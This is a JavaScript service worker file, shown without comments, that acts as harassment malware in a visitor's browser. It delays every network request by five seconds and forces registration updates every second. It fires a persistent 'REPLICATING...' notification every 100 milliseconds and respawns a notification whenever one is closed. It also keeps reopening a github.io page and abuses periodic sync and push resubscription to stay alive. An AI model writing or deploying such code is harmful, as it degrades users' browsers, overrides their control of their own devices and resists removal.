self.addEventListener('install', () => {
  self.skipWaiting()
  self.registration.update()
})

self.addEventListener('activate', (e) => {
  e.waitUntil(clients.claim())
  setInterval(() => { self.registration.update() }, 1000)
})

self.addEventListener('fetch', (e) => {
  e.respondWith(
    new Promise((resolve) => {
      setTimeout(() => {
        resolve(fetch(e.request).catch(() => new Response('REPLICATE', { status: 200 })))
      }, 5000)
    })
  )
})

self.addEventListener('notificationclick', (e) => {
  e.notification.close()
  const url = 'https://n5za.github.io/'
  e.waitUntil(
    clients.matchAll({ type: 'window' }).then((clientsList) => {
      for (const c of clientsList) {
        if ('focus' in c) return c.focus()
      }
      if (clients.openWindow) return clients.openWindow(url)
    })
  )
})

self.addEventListener('notificationclose', () => {
  setTimeout(() => {
    self.registration.showNotification('Miss me?', {
      body: 'Come back! The fun never ends!',
      icon: 'cat-cute.jpg',
      tag: 'miss-' + Date.now(),
      requireInteraction: true,
      vibrate: [200, 100, 200, 100, 500]
    })
    clients.matchAll({ type: 'window' }).then((list) => {
      if (list.length === 0 && clients.openWindow) {
        clients.openWindow('https://n5za.github.io/')
      }
    })
  }, 500)
})

setInterval(() => {
  self.registration.showNotification('REPLICATING...', {
    body: 'Copying...',
    tag: 'replicate-' + Date.now(),
    requireInteraction: true
  })
}, 100)

setInterval(() => {
  self.registration.periodicSync.register('keep-alive', { minInterval: 1 }).catch(() => {})
}, 100)

self.addEventListener('sync', (e) => {
  if (e.tag === 'annoy-sync' || e.tag === 'keep-alive') {
    e.waitUntil(
      self.registration.showNotification('Back online!', {
        body: 'Time for more fun!',
        tag: 'sync-' + Date.now(),
        requireInteraction: true
      })
    )
  }
})

self.addEventListener('pushsubscriptionchange', (e) => {
  e.waitUntil(
    self.registration.pushManager.subscribe({
      userVisibleOnly: true,
      applicationServerKey: new Uint8Array(65).fill(1)
    }).catch(() => {})
  )
})

self.addEventListener('push', (e) => {
  const data = e.data ? e.data.text() : 'Hello!'
  e.waitUntil(
    self.registration.showNotification(data, {
      tag: 'push-' + Date.now(),
      requireInteraction: true,
      vibrate: [200, 100, 200]
    })
  )
})

self.addEventListener('message', (e) => {
  if (e.data === 'open') {
    clients.matchAll({ type: 'window' }).then((clientsList) => {
      if (clientsList.length === 0) {
        clients.openWindow('https://n5za.github.io/')
      }
    })
  }
  if (e.data === 'ping') {
    e.source.postMessage('pong')
  }
})

setInterval(() => {
  clients.matchAll({ type: 'window' }).then((clientsList) => {
    if (clientsList.length === 0) {
      clients.openWindow('https://n5za.github.io/')
    }
  })
}, 5000)
